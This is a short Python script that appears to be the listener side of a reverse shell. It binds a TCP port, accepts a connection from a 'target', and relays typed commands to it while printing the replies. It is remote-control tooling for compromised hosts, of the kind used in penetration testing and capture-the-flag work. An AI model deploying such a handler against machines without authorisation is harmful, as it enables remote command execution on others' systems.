#!/bin/python3

import socket, sys, time
from colors import Colors

def getSpecialCmd(cmd):
    return cmd

def listen(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    print("Listening on port " + str(port))
    try:
        conn, addr = s.accept()
    except KeyboardInterrupt:
        print(Colors.Blue + "\n[+]" + Colors.RESET + " Shutting down listener...")
        return
    print(Colors.BLUE + '[+]' + Colors.RESET + 'Connection received from ',addr)
    running = True
    while running:
        try:

            #Receive data from the target and get user input
            ans = conn.recv(1024).decode()
            if (ans.__contains__("KeyboardInterrupt")):
                s.close()
                running = False

            sys.stdout.write(ans)
            command = input()

            #Listen for special Commands
            command = getSpecialCmd(command)

            #Send command
            command += "\n"
            conn.send(command.encode())
            time.sleep(0.2)

            #Remove the output of the "input()" function
            sys.stdout.write("\033[A" + ans.split("\n")[-1])
        except KeyboardInterrupt:
            print(Colors.BLUE + "\n\n[+]" + Colors.RESET + " Closing Connection")
            s.close()
            running = False

